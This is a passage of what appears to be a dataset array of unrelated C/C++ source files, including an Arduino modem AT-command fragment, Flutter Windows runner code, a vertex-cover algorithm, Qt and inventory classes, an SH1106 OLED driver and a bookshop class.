=> disable / 3 => disable but allow CSD\n}\n\nString setupTTL() {\n    Serial.println(\"AT+CTTSPARAM=50,1,50,50,0\");\n}\nString TTL() {\n    Serial.println(\"AT+CTTS=2, Hello\");\n}\n\nString profileController(String option) {\n    switch(option) {\n        case \"reset\":\n        Serial.println(\"AT&D\");\n        break;\n        case \"get\":\n        Serial.println(\"AT&V\");\n        break;\n        case \"set\":\n        Serial.println(\"AT&S\");\n        break;\n        default:\n        break;\n    }\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nstruct Graph\r\n{\r\n    int V; //Number of vertices\r\n    vector<unordered_set<char>> adj; //Adjacency list\r\n\r\n    Graph(int V) : V(V) \r\n    {\r\n        adj.resize(V);\r\n    }\r\n\r\n    //Function to add an edge to the graph\r\n    void addEdge(char u, char v) \r\n    {\r\n        adj[u - 'a'].insert(v);\r\n    }\r\n\r\n    //Function to find pendant vertices\r\n    set<char> findPendantVertices() \r\n    {\r\n        set<char> pendantVertices;\r\n        for (char u = 'a'; u < 'a' + V; ++u) {\r\n            if (adj[u - 'a'].size() == 1) { // Check if vertex u is a pendant vertex\r\n                pendantVertices.insert(u);\r\n            }\r\n        }\r\n        return pendantVertices;\r\n    }\r\n\r\n    //Function to find the maximum degree vertex\r\n    vector<char> findMaxDegreeVertex() {\r\n        int maxDegree = 0;\r\n        vector<char> maxDegreeVertices;\r\n\r\n        for (char u = 'a'; u < 'a' + V; ++u)\r\n        {\r\n            if (adj[u - 'a'].size() > maxDegree) \r\n            {\r\n                maxDegree = adj[u - 'a'].size();\r\n                maxDegreeVertices.clear();\r\n                maxDegreeVertices.push_back(u);\r\n            } \r\n            else if(adj[u - 'a'].size() == maxDegree) \r\n            {\r\n                maxDegreeVertices.push_back(u);\r\n            }\r\n        }\r\n        return maxDegreeVertices;\r\n    }\r\n\r\n    // Function to remove a vertex and its incident edges from the graph\r\n    void removeEdgeVertex(set<pair<char, char>> &E, char &u)\r\n    {\r\n        vector<pair<char, char>> toRemove;\r\n        for(auto it:E)\r\n        {\r\n            if(it.first == u || it.second == u)\r\n                toRemove.push_back(it);\r\n        }\r\n        for(auto it:toRemove)\r\n        {\r\n            E.erase(it);\r\n        }\r\n\r\n        for (char v : adj[u - 'a']) {\r\n            adj[v - 'a'].erase(u);\r\n        }\r\n        adj[u - 'a'].clear();\r\n\r\n    }\r\n\r\n    //Function to compute the vertex cover using SD(G) algorithm\r\n    set<char> findVertexCover() {\r\n        set<char> VC; // Vertex cover\r\n        set<pair<char, char>> E; // Set of remaining edges\r\n\r\n        // Initialize E with all edges\r\n        for (char u = 'a'; u < 'a' + V; ++u)\r\n        {\r\n            for (char v : adj[u - 'a'])\r\n            {\r\n                E.insert({u,v});\r\n            }\r\n        }\r\n\r\n        set<char> P = findPendantVertices(); // Set of pendant vertices\r\n        \r\n        // Step 5: While P is not empty\r\n        while(!P.empty())\r\n        {\r\n            // Step 7: Select any vertex u from P\r\n            char u = *P.begin();\r\n            // Step 8: Get an adjacent vertex v\r\n            char v = *adj[u - 'a'].begin();\r\n            // Step 9: Add v to VC\r\n            VC.insert(v);\r\n            /*\r\n            cout<<\"Added:\"<<v<<endl;\r\n            */\r\n            // Step 10: Remove edges incident on v\r\n            removeEdgeVertex(E, v);\r\n            // Update P and E\r\n            P = findPendantVertices();\r\n        }\r\n\r\n        // Step 13: While E is not empty\r\n        while (!E.empty()) {\r\n            // Step 15: Find maximum degree vertex\r\n            vector<char> maxDegreeVertices = findMaxDegreeVertex();\r\n\r\n            /*\r\n            cout<<\"Max degree vertices are: \"<<endl;\r\n            for(auto max: maxDegreeVertices){\r\n            \tcout<<max<<\" \";\r\n            }\r\n            cout<<endl;\r\n            */\r\n\r\n            // Step 18: Choose the maximum degree vertex that covers a unique edge among all maximum degree vertices\r\n\t\t\tchar m = maxDegreeVertices[0]; // Initialize with the first vertex in the list\r\n\t\t\tbool found = false;\r\n\r\n\t\t\t// Iterate over each maximum degree vertex\r\n\t\t\tfor (char u : maxDegreeVertices)\r\n            {\r\n\t\t\t    // Check if the current vertex covers a unique edge\r\n\t\t\t    bool uniqueEdge = false;\r\n\t\t\t    for (char i : adj[u-'a'])\r\n                {\r\n                    int flag = 1;\r\n\t\t\t        for(char v : maxDegreeVertices)\r\n                    {\r\n                        if(v != u && adj[v-'a'].find(i) != adj[v-'a'].end())\r\n                        {\r\n                            flag = 0;\r\n                            break;\r\n                        }\r\n                    }\r\n\r\n                    if(flag == 1)\r\n                    {\r\n                        uniqueEdge = true;\r\n                        break;\r\n                    }\r\n\t\t\t    }\r\n\r\n\t\t\t    // If the current vertex covers a unique edge, update the chosen vertex\r\n\t\t\t    if (uniqueEdge)\r\n                {\r\n\t\t\t        m = u;\r\n\t\t\t        found = true;\r\n\t\t\t        break;\r\n\t\t\t    }\r\n\t\t\t}\r\n\r\n\t\t\t// If no maximum degree vertex covers a unique edge, choose the first vertex in the list\r\n\t\t\tif(!found)\r\n            {\r\n\t\t\t    m = maxDegreeVertices[0];\r\n            }\r\n\r\n            // Step 19: Add m to VC\r\n            VC.insert(m);\r\n            cout<<\"v:\"<<m<<endl;\r\n\r\n            // Step 20: Remove edges incident on m\r\n            removeEdgeVertex(E, m);\r\n        }\r\n\r\n        return VC;\r\n    }\r\n};\r\n\r\nint main()\r\n{\r\n    /*\r\n    map<char,set<char>> mp = {\r\n    {'a",
    "#include \"componentInfo.h\"\n\ncomponentInfo::componentInfo(component& coreComponent, QWidget* parent): QWidget(parent), coreComponent(coreComponent){\n    QVBoxLayout* layout = new QVBoxLayout(this);\n    componentNameLabel= new QLabel(\"NOME DEL COMPONENTE: \" + QString::fromStdString(coreComponent.getName()));\n    componentNameLabel->setWordWrap(true);\n    layout->addWidget(componentNameLabel);\n\n    componentDescriptionLabel= new QLabel(\"DESCRIZIONE DEL COMPONENTE: \" + QString::fromStdString(coreComponent.getDescription()));\n    componentDescriptionLabel->setWordWrap(true);\n    layout->addWidget(componentDescriptionLabel);\n\n    //info derivate: (in base al tipo dinamico)\n    componentInfoVisitor visitor;\n    coreComponent.accept(visitor);\n    visitorWidget = visitor.getWidget();\n    layout->addWidget(visitorWidget);\n\n    layout->addStretch();\n}\n\nvoid componentInfo::updateInfo(component& coreComponent){\n    componentInfoVisitor visitor;\n    coreComponent.accept(visitor);\n    QWidget* newVisitorWidget = visitor.getWidget();\n    QLayoutItem* oldLayout = this->layout()->replaceWidget(visitorWidget,newVisitorWidget);\n    delete visitorWidget;\n    visitorWidget=newVisitorWidget;\n    delete oldLayout;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_application_2\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"Item.h\"\nItem::Item(){\n    SKU = -1;\n    description = \"\";\n    price = -1;\n    UOM = \"null\";\n    quantityOnHand = -1;\n    leadTime = -1;\n}\n\nItem::Item(int idnum){\n    SKU = idnum;\n}\n\nItem::Item(int idNum, std::string descp, double cost, std::string unit, int orderTime, int quantity){\n    SKU = idNum;\n    description = descp;\n    price = cost;\n    UOM = unit;\n    leadTime = orderTime;\n    quantityOnHand = quantity;\n}\n\nstd::string Item::GetPartInfo(){\n    return std::to_string(SKU) + \" - \" + description;\n}\n\ndouble Item::GetPrice(){\n    return price;\n}\n\nbool Item::InStock(){\n    return quantityOnHand > 0;\n}\n\n//TODO: make the dates work as intented\nbool Item::IsAvailable(int desiredDay){\n    if (InStock()){\n        return true;\n    }\n    else {\n        return desiredDay <= leadTime;\n    }\n}\n\n\nbool Item::operator==(const Item& obj){\n    return this->SKU == obj.SKU;\n}\n\nbool Item::operator<(const Item& obj){\n    return this->SKU < obj.SKU;\n}\n\nbool Item::operator>(const Item& obj){\n    return this->SKU > obj.SKU;\n}\n\n",
    "/*********************************************************************\nThis is a library for our Monochrome OLEDs based on SSD1306 drivers\n\n  Pick one up today in the adafruit shop!\n  ------> http://www.adafruit.com/category/63_98\n\nThese displays use SPI to communicate, 4 or 5 pins are required to  \ninterface\n\nAdafruit invests time and resources providing this open source code, \nplease support Adafruit and open-source hardware by purchasing \nproducts from Adafruit!\n\nWritten by Limor Fried/Ladyada  for Adafruit Industries.  \nBSD license, check license.txt for more information\nAll text above, and the splash screen below must be included in any redistribution\n*********************************************************************/\n\n/*********************************************************************\nI change the adafruit SSD1306 to SH1106\n\nSH1106 driver similar to SSD1306 so, just change the display() method.\n\nHowever, SH1106 driver don't provide several functions such as scroll commands.\n\n\n*********************************************************************/\n\n#include <avr/pgmspace.h>\n#ifndef __SAM3X8E__\n #include <util/delay.h>\n#endif\n#include <stdlib.h>\n\n#include <Wire.h>\n\n#include \"Adafruit_GFX.h\"\n#include \"Adafruit_SH1106.h\"\n\n// the memory buffer for the LCD\n\nstatic uint8_t buffer[SH1106_LCDHEIGHT * SH1106_LCDWIDTH / 8] = { \n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80,\n0x80, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x80, 0x80, 0xC0, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x80, 0xC0, 0xE0, 0xF0, 0xF8, 0xFC, 0xF8, 0xE0, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x80, 0x80,\n0x80, 0x80, 0x00, 0x80, 0x80, 0x00, 0x00, 0x00, 0x00, 0x80, 0x80, 0x80, 0x80, 0x80, 0x00, 0xFF,\n#if (SH1106_LCDHEIGHT * SH1106_LCDWIDTH > 96*16)\n0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x80, 0x80, 0x80, 0x80, 0x00, 0x00, 0x80, 0x80, 0x00, 0x00,\n0x80, 0xFF, 0xFF, 0x80, 0x80, 0x00, 0x80, 0x80, 0x00, 0x80, 0x80, 0x80, 0x80, 0x00, 0x80, 0x80,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x80, 0x00, 0x00, 0x8C, 0x8E, 0x84, 0x00, 0x00, 0x80, 0xF8,\n0xF8, 0xF8, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xF0, 0xE0, 0xE0, 0xC0, 0x80,\n0x00, 0xE0, 0xFC, 0xFE, 0xFF, 0xFF, 0xFF, 0x7F, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0xFF, 0xC7, 0x01, 0x01,\n0x01, 0x01, 0x83, 0xFF, 0xFF, 0x00, 0x00, 0x7C, 0xFE, 0xC7, 0x01, 0x01, 0x01, 0x01, 0x83, 0xFF,\n0xFF, 0xFF, 0x00, 0x38, 0xFE, 0xC7, 0x83, 0x01, 0x01, 0x01, 0x83, 0xC7, 0xFF, 0xFF, 0x00, 0x00,\n0x01, 0xFF, 0xFF, 0x01, 0x01, 0x00, 0xFF, 0xFF, 0x07, 0x01, 0x01, 0x01, 0x00, 0x00, 0x7F, 0xFF,\n0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x7F, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0xFF,\n0xFF, 0xFF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x03, 0x0F, 0x3F, 0x7F, 0x7F, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xE7, 0xC7, 0xC7, 0x8F,\n0x8F, 0x9F, 0xBF, 0xFF, 0xFF, 0xC3, 0xC0, 0xF0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFC, 0xFC, 0xFC,\n0xFC, 0xFC, 0xFC, 0xFC, 0xFC, 0xF8, 0xF8, 0xF0, 0xF0, 0xE0, 0xC0, 0x00, 0x01, 0x03, 0x03, 0x03,\n0x03, 0x03, 0x01, 0x03, 0x03, 0x00, 0x00, 0x00, 0x00, 0x01, 0x03, 0x03, 0x03, 0x03, 0x01, 0x01,\n0x03, 0x01, 0x00, 0x00, 0x00, 0x01, 0x03, 0x03, 0x03, 0x03, 0x01, 0x01, 0x03, 0x03, 0x00, 0x00,\n0x00, 0x03, 0x03, 0x00, 0x00, 0x00, 0x03, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,\n0x03, 0x03, 0x03, 0x03, 0x03, 0x01, 0x00, 0x00, 0x00, 0x01, 0x03, 0x01, 0x00, 0x00, 0x00, 0x03,\n0x03, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n#if (SH1106_LCDHEIGHT == 64)\n0x00, 0x00, 0x00, 0x80, 0xC0, 0xE0, 0xF0, 0xF9, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x3F, 0x1F, 0x0F,\n0x87, 0xC7, 0xF7, 0xFF, 0xFF, 0x1F, 0x1F, 0x3D, 0xFC, 0xF8, 0xF8, 0xF8, 0xF8, 0x7C, 0x7D, 0xFF,\n0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x7F, 0x3F, 0x0F, 0x07, 0x00, 0x30, 0x30, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0xFE, 0xFE, 0xFC, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x",
    "#include \"bookshop.h\"\n#include <iostream>\n\nusing namespace std;\n\nint Bookshop::num_of_objects = 0;\n\nBookshop::Bookshop() {\n    m_books = nullptr;\n    num_of_objects++;\n\n    #ifdef _DEBUG\n    cout << \"Wywolano konstruktor domyslny klasy Bookshop, aktualna liczba obiektow tej klasy: \" << num_of_objects << endl;\n    #endif\n}\n\nBookshop::Bookshop(string name, Manager manager) {\n    m_name = name;\n    m_manager = manager;\n    num_of_objects++;\n    m_books = nullptr;\n\n    #ifdef _DEBUG\n    cout << \"Wywolano konstruktor klasy Bookshop, aktualna liczba obiektow tej klasy: \" << num_of_objects << endl;\n    #endif\n\n}\n\nBookshop::Bookshop(const Bookshop &bs) {\n    m_name = bs.m_name;\n    m_manager = bs.m_manager;\n    m_num_of_books = bs.m_num_of_books;\n\n    if (bs.m_books) {\n        m_books = new Book[m_num_of_books];\n        for (int i = 0; i < m_num_of_books; i++) {\n            m_books[i] = bs.m_books[i];\n        }\n    }\n    else\n        m_books = nullptr;\n    num_of_objects++;\n\n    #ifdef _DEBUG\n    cout << \"Wywolano konstruktor kopiujacy klasy Bookshop, aktualna liczba obiektow tej klasy: \" << num_of_objects << endl;\n    #endif\n}\n\nBookshop& Bookshop::operator=(const Bookshop &bs) {\n    if (this == &bs) {\n        return *this;\n    }\n\n    m_name = bs.m_name;\n    m_manager = bs.m_manager;\n    m_num_of_books = bs.m_num_of_books;\n\n    if (m_books) {\n        delete[] m_books;\n    }\n\n    if (bs.m_books) {\n        m_books = new Book[m_num_of_books];\n        for (int i = 0; i < m_num_of_books; i++) {\n            m_books[i] = bs.m_books[i];\n        }\n    }\n    else\n        m_books = nullptr;\n\n    return *this;\n}\n\nBookshop::~Bookshop() {\n    if (m_books != nullptr) {\n        delete[] m_books;\n    }\n\n    num_of_objects--;\n\n    #ifdef _DEBUG\n    cout << \"Wywolano destruktor klasy Bookshop, aktualna liczba obiektow tej klasy: \" << num_of_objects << endl;\n    #endif\n}\n\nint Bookshop::numOfElems() {\n    return num_of_objects;\n}\n\nostream& operator<<(ostream &s, Bookshop &bs) {\n    s << \"Nazwa ksiegarni: \" << bs.m_name << endl << \"Imie managera: \" << bs.m_manager.managersName() << endl\n      << \"Liczba ksiazek: \" << bs.m_num_of_books << endl;\n\n    if (bs.m_books)\n        for (int i = 0; i < bs.m_num_of_books; i++) {\n            s << \"Ksiazka nr \" << i << \": \" << endl << bs.m_books[i] << endl;\n        }\n\n    return s;\n}\n\nBook& Bookshop::operator[](int i) {\n    if (i < 0 || i >= m_num_of_books) {\n        throw logic_error( \"Nie ma ksiazki o takim indeksie\" );\n    }\n    else\n        return m_books[i];\n}\n\nBookshop& Bookshop::operator+=(const Bookshop &bs) {\n    int size = m_num_of_books + bs.m_num_of_books;\n    Book *tmp_array = new Book[size];\n    int a = m_num_of_books;\n\n    for (int i = 0; i < m_num_of_books; i++) {\n        tmp_array[i] = m_books[i];\n    }\n\n    for (int i = 0; i < bs.m_num_of_books; i++) {\n        for (int j = 0; j < m_num_of_books; j++) {\n            if (m_books[j] == bs.m_books[i]) {\n                size--;\n                break;\n            }\n            if (j == m_num_of_books - 1) {\n                tmp_array[a] = bs.m_books[i];\n                a++;\n            }\n        }\n    }\n\n    if (m_books)\n        delete[] m_books;\n\n    m_num_of_books = size;\n    m_books = new Book[size];\n\n    for (int i = 0; i < size; i++) {\n        m_books[i] = tmp_array[i];\n    }\n\n    delete[] tmp_array;\n    return *this;\n}\n\nBookshop::operator string() {\n    return (string)\"Ksiegarnia: \" + m_name + (string)\", Manager: \" + m_manager.managersName()\n           + (string)\", Liczba ksiazek: \" + to_string(m_num_of_books);\n}\n\nBookshop& Bookshop::operator--() {\n    if (!m_books)\n        return *this;\n\n    m_num_of_books--;\n    Book *tmp = new Book[m_num_of_books];\n\n    for (int i = 0; i < m_num_of_books; i++) {\n        tmp[i] = m_books[i];\n    }\n\n    delete[] m_books;\n    m_books = tmp;\n    return *this;\n}\n\nvoid Bookshop::addBook(const Book &b) {\n    for (int i = 0; i < m_num_of_books; i++) {\n        if (m_books[i] == b)\n            return;\n    }\n\n    Book *new_m_books = new Book[m_num_of_books + 1];\n    for (int i = 0; i < m_num_of_books; i++) {\n        new_m_books[i] = m_books[i];\n    }\n\n    new_m_books[m_num_of_books] = b;\n    m_num_of_books++;\n\n    if (m_books)\n        delete[] m_books;\n    m_books = new_m_books;\n}\n\nvoid Bookshop::deleteBook(int idx) {\n    if (idx < 0 || idx > m_num_of_books - 1)\n        return;\n\n    Book *new_m_books = new Book[m_num_of_books - 1];\n\n    for (int i = 0; i < idx; i++) {\n        new_m_books[i] = m_books[i];\n    }\n\n    for (int i = idx + 1; i < m_num_of_books; i++) {\n        new_m_books[i - 1] = m_books[i];\n    }\n\n    m_num_of_books--;\n    delete[] m_books;\n    m_books = new_m_books;\n}\n\n",
    "#include <Arduino.h>\n#include \"TabStopDataBase.h\"\n#include \"TabStopDriverClass.hpp\"\n#include \"TabStopReader.h\"\n#include \"TabStopDriver.h\"\n\n#pragma GCC optimize(\"-O0\")\n\n\n// TabStopsEngine all drivers off, leave in their current position.\nTabStopsEngine::~TabStopsEngine() {\n  for (int i = 0; stops[i].I2C_BIT != -1 && stops[i].SPIaddress != -1; i++) {\n    TabOff(i);\n  }\n}\n\n// drive all tabs to the \"off\" position\nvoid TabStopsEngine::init() {\n  for (int i = 0; stops[i].I2C_BIT != -1 && stops[i].SPIaddress != -1; i++) {\n    tabOff(i);\n    stops[i].MyState = standby;\n  }\n}\n\nconst int DRIVETIME = 200;  // drive for n milliseconds\n\n// update the tab data base\n// looking for tabs that are being driven and are wating for their timeout to\n// stop driving\nvoid TabStopsEngine::loop() {\n\n  // look through the data base for stops that need to be moved or are done\n  for (int i = 0; stops[i].I2C_BIT != -1 && stops[i].SPIaddress != -1; i++) {\n    switch (stops[i].MyState) {\n      case standby:\n        // do nothing\n        break;\n\n      case start_on:\n        // Serial.print(\"Turing tab\");\n        // Serial.print(i);\n        // Serial.print(\" on \");\n        // Serial.println (stops[i].TabStop);\n\n        TabSetOn(i);\n        stops[i].DriveTimeStamp = millis();\n        stops[i].MyState = wait_on;\n        break;\n\n      case start_off:\n        // Serial.print(\"Turing tab\");\n        // Serial.print(i);\n        // Serial.println(\" off\");\n        // Serial.println (stops[i].TabStop);\n\n        TabSetOff(i);\n        stops[i].DriveTimeStamp = millis();\n        stops[i].MyState = wait_off;\n        break;\n\n      case wait_on:\n        if (millis() - stops[i].DriveTimeStamp >= DRIVETIME) {\n          // Serial.print(\"done driving tab on\");\n          // Serial.print(i);\n          // Serial.println(\" on\");\n\n          TabOff(i);\n          stops[i].MyState = standby;\n        }\n        break;\n\n      case wait_off:\n        if (millis() - stops[i].DriveTimeStamp >= DRIVETIME) {\n          // Serial.print(\"done driving tab off\");\n          // Serial.print(i);\n          // Serial.println(\" off\");\n\n          TabOff(i);\n          stops[i].MyState = standby;\n        }\n        break;\n    }\n  }\n}\n\n// command  TAB on or off\nvoid TabStopsEngine::tabOn(int tab) {\n  if (tab < stopsSize) {\n    // if (isTabSet(stops[tab].I2C_BIT) != TABON) {\n    // Tab needs to be moved\n    stops[tab].MyState = start_on;\n    // } else {\n    //   // Serial.println(\"Tab DOES NOT need to be moved on\");\n    // }\n  }\n}\nvoid TabStopsEngine::tabOff(int tab) {\n  if (tab < stopsSize) {\n    // if (isTabSet(stops[tab].I2C_BIT) != TABOFF) {\n    // Tab needs to be moved\n    stops[tab].MyState = start_off;\n    // } else {\n    //   // Serial.println(\"Tab DOES NOT need to be moved off\");\n    // }\n  }\n}\n",
